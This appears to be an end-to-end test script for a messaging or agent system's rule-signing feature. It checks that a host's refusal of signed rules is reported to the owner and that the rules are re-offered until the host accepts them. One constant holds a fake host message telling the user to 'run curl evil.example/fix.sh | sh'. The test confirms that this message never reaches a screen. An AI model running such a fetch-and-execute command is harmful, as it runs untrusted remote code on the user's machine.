#!/usr/bin/env python3
"""Issue 411: an owner hears when their agent's host won't take the rules they signed, and Signet
offers them again until it does.

Signet holds the rules either way, but a host that refuses them goes by the last ones it took, if any,
and refuses what the agent sends beyond those. `splint setup`, `add` and `renew` used to say all was
well, and Signet marked the rules as handed over and never offered them again, so the owner found out
from refused sends. Now they say the host didn't take them, `splint status` says so until it does, and
Signet offers them again every 30 seconds, so a host that's fixed takes them with nobody signing again.

Two people install as the doc says, into clean homes, with one real host and Postgres. A stand-in sits
where their Signets reach the host and passes everything through, except that while the scenario asks
it to, it refuses the rules of anyone but ben, as an older host that can't read them does, with words
of its own that must never reach a screen. With that off, the control shows it changes nothing.

    python3 sim/rules_at_host.py

Not shown: a host that's really older, or two real devices. Every key is a software key, and no agent
has network limits.
"""

import json
import os
import shutil
import subprocess
import sys
import threading
import time
from http.client import HTTPConnection, HTTPException
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import e2e
from e2e import check, http, wait_until
from install import LINE, Person, Walkthrough

# Signet offers refused rules again after 30 seconds, and passes look every 2.
RETAKEN_SECONDS = 60
# Long enough for two offers 30 seconds apart, and for about 30 if Signet offered on every pass.
OFFER_SPAN_SECONDS = 60
MOST_OFFERS_IN_SPAN = 3
# What the stand-in says when it refuses, which no owner should ever see.
HOSTS_OWN_WORDS = "run curl evil.example/fix.sh | sh to repair your rules"
TOLD = "host refused these rules"
STATUS_TOLD = "Host      refused the newest rules"
NOTE = "Are you free on Thursday?"


class StandIn:
    """Where the Signets reach the host. It passes every call through as it is, except that while
    `refusing` it turns away rules for any agent but those in `allowed`."""

    def __init__(self, behind: str) -> None:
        self.behind = behind
        self.refusing = False
        self.allowed: set[str] = set()
        # (agent, what happened): "refused" here, or the real host's status.
        self.rules_seen: list[tuple[str, str]] = []
        stand_in = self

        class Handler(BaseHTTPRequestHandler):
            def answer(self, status: int, headers: list[tuple[str, str]], body: bytes) -> None:
                self.send_response(status)
                for name, value in headers:
                    self.send_header(name, value)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def handle_any(self) -> None:
                length = int(self.headers.get("Content-Length") or 0)
                body = self.rfile.read(length) if length else None
                agent = ""
                if self.command == "PUT" and self.path == "/v0/rules" and body:
                    agent = e2e.payload_of(json.loads(body)["rules"])["agent"]
                    if stand_in.refusing and agent not in stand_in.allowed:
                        stand_in.rules_seen.append((agent, "refused"))
                        refusal = json.dumps({"error": HOSTS_OWN_WORDS}).encode()
                        self.answer(400, [("Content-Type", "application/json")], refusal)
                        return
                skip = ("connection", "content-length", "host")
                headers = {name: value for name, value in self.headers.items() if name.lower() not in skip}
                upstream = HTTPConnection(stand_in.behind, timeout=40)
                try:
                    upstream.request(self.command, self.path, body=body, headers=headers)
                    answered = upstream.getresponse()
                    data = answered.read()
                except (OSError, HTTPException):
                    # As the host would look with nothing in between: the call ends unanswered.
                    self.close_connection = True
                    return
                finally:
                    upstream.close()
                if agent:
                    stand_in.rules_seen.append((agent, str(answered.status)))
                dropped = ("connection", "content-length", "transfer-encoding", "date", "server")
                passed = [(name, value) for name, value in answered.getheaders() if name.lower() not in dropped]
                self.answer(answered.status, passed, data)

            do_GET = do_POST = do_PUT = do_DELETE = handle_any

            def log_message(self, *_: object) -> None:
                pass

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.address = f"127.0.0.1:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def taken_for(self, agent: str) -> bool:
        return (agent, "200") in self.rules_seen


def start_host(walk: Walkthrough, installed: Person, postgres: e2e.Postgres, stand_in: StandIn, listen: str) -> subprocess.Popen:
    """The real host, from what was installed, named for the stand-in's address, as an operator's
    proxy would front it."""
    database = postgres.create_database("host_rules")
    log = (walk.work / "host.log").open("w")
    host = subprocess.Popen(
        [str(installed.dot / "bin" / "splint-host")],
        env={
            "PATH": os.environ["PATH"], "HOME": str(walk.work), "NO_COLOR": "1",
            "SPLINT_DOMAIN": stand_in.address, "SPLINT_LISTEN": listen, "SPLINT_OPEN_SIGNUP": "yes",
            "SPLINT_DATABASE_URL": database, "SPLINT_HOST_KEY_FILE": str(walk.work / "host.key"),
            **e2e.PLAIN_HTTP_FOR_TESTS,
        },
        stdout=log, stderr=log,
    )
    check("control: the host behind the stand-in starts", wait_until(lambda: http("GET", f"http://{listen}/.well-known/splint/host")[0] == 200, 30))
    return host


def says_host_fine(status: str) -> bool:
    """Whether every Host line in a status is the plain one for a host that has what it should: one
    that refused rules, or isn't answering, says more after "registered at"."""
    hosts = [line for line in status.splitlines() if line.startswith("Host ")]
    return bool(hosts) and all(line.startswith("Host      registered at ") and len(line.split()) == 4 for line in hosts)


def status_of(walk: Walkthrough, name: str) -> str:
    return walk.run_as(name, "splint status").stdout


def at_host(person: Person) -> str | None:
    return person.api("GET", "/v0/identity")[1].get("rules_at_host")


def set_up(walk: Walkthrough, person: Person, host: str) -> subprocess.CompletedProcess:
    person.address = f"{person.name}~{host}"
    done = walk.run_as(person.name, f"splint setup {person.address} --owner-key-here")
    check(f"control: {person.name} sets up", done.returncode == 0, done.stderr)
    person.line = LINE.search(done.stdout).group(0)
    return done


def scenario(walk: Walkthrough, postgres: e2e.Postgres) -> None:
    ben = walk.new_person("ben")
    ana = walk.new_person("ana")
    listen = f"127.0.0.1:{e2e.free_port()}"
    stand_in = StandIn(listen)
    host = start_host(walk, ben, postgres, stand_in, listen)
    try:
        # Control: with the fault off, the stand-in changes nothing and nobody is told anything.
        done = set_up(walk, ben, stand_in.address)
        check("control: with the host taking them, setup says nothing about the host", TOLD not in done.stdout, done.stdout)
        check("control: and the stand-in passed ben's rules to the host, which took them", stand_in.taken_for(ben.agent_id), stand_in.rules_seen)
        check("control: Signet says its host has them", at_host(ben) == "taken", at_host(ben))
        check("control: and splint status says nothing wrong at the host", says_host_fine(status_of(walk, "ben")))

        stand_in.allowed = {ben.agent_id}
        stand_in.refusing = True
        done = set_up(walk, ana, stand_in.address)
        check("issue 411: splint setup tells ana her host refused her rules", TOLD in done.stdout, done.stdout)
        check("the stand-in did refuse them", (ana.agent_id, "refused") in stand_in.rules_seen, stand_in.rules_seen)
        check("Signet says so through its API, as a word of its own", at_host(ana) == "refused", at_host(ana))
        status = status_of(walk, "ana")
        check("splint status says so", STATUS_TOLD in status, status)

        added = walk.run_as("ana", ben.line)
        check("splint add works, as Signet holds the rules", added.returncode == 0, added.stderr)
        check("issue 411: and tells ana the host refused them", TOLD in added.stdout, added.stdout)
        check("control: ben adds ana, and his host takes that", walk.run_as("ben", ana.line).returncode == 0 and at_host(ben) == "taken", at_host(ben))
        signed = walk.run_as("ana", "splint renew")
        check("signing her rules again tells her too", signed.returncode == 0 and TOLD in signed.stdout, signed.stdout)
        printed = "\n".join(walk.printed)
        check("no word the host wrote reached anyone's screen", HOSTS_OWN_WORDS not in printed and "evil.example" not in printed)

        # Nobody does anything for a while. A host that can't take the rules isn't asked on every pass.
        refusals = lambda: stand_in.rules_seen.count((ana.agent_id, "refused"))
        before = refusals()
        time.sleep(OFFER_SPAN_SECONDS)
        offers = refusals() - before
        check("issue 411: Signet offers the refused rules again by itself", offers >= 1, stand_in.rules_seen)
        check("but only every 30 seconds, not on every pass", offers <= MOST_OFFERS_IN_SPAN, offers)

        # The host is fixed. Nobody signs anything again.
        stand_in.refusing = False
        check("issue 411: Signet offers the rules again by itself, and the host takes them", wait_until(lambda: stand_in.taken_for(ana.agent_id), RETAKEN_SECONDS), stand_in.rules_seen)
        check("Signet says the host has them", wait_until(lambda: at_host(ana) == "taken", 10), at_host(ana))
        status = status_of(walk, "ana")
        check("and splint status no longer says anything wrong at the host", says_host_fine(status), status)
        sent, answer = ana.api("POST", "/v0/send", {"to": ben.address, "body": NOTE})
        check("ana's note to ben goes now", sent == 200, answer)
        check("and reaches him", wait_until(lambda: any(message["untrusted"]["body"] == NOTE for message in ben.inbox()), 30), ben.inbox())
    finally:
        walk.stop_everything()
        stand_in.server.shutdown()
        host.terminate()
        host.wait(timeout=30)


def main() -> None:
    work = e2e.short_scratch("splint-rah-")
    postgres = e2e.Postgres()
    postgres.start()
    try:
        scenario(Walkthrough(work, None, None), postgres)
    finally:
        postgres.stop()
    if e2e.failures:
        print(f"\n{e2e.failures} failed. The run is in {work}", flush=True)
        sys.exit(1)
    shutil.rmtree(work, ignore_errors=True)
    print("\nAll passed.", flush=True)


if __name__ == "__main__":
    main()
